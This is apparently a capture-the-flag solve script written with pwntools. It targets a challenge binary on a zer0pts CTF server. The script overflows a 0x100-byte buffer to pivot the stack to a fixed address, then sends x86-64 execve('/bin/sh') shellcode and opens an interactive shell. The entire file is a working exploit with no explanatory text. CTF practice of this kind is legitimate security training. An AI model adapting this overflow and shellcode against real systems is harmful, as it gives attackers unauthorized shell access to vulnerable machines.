from pwn import *

elf = context.binary = ELF("./chall")

# p = gdb.debug(elf.path, '''
# b *vuln+44
#
# c
# ''')

# p = process(elf.path)
p = remote('pwn.ctf.zer0pts.com', 9011)

BUFFER_LEN = 0x100
NEW_STACK_LOCATION = 0x600234
print(p.recvuntil('Data: '))

p.sendline(b'A' * BUFFER_LEN + p64(NEW_STACK_LOCATION + 0x100))

print(p.recvuntil('Data: '))
shellcode = p64(0) + p64(NEW_STACK_LOCATION+0x10)
shellcode += b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
p.sendline(shellcode)

p.interactive()

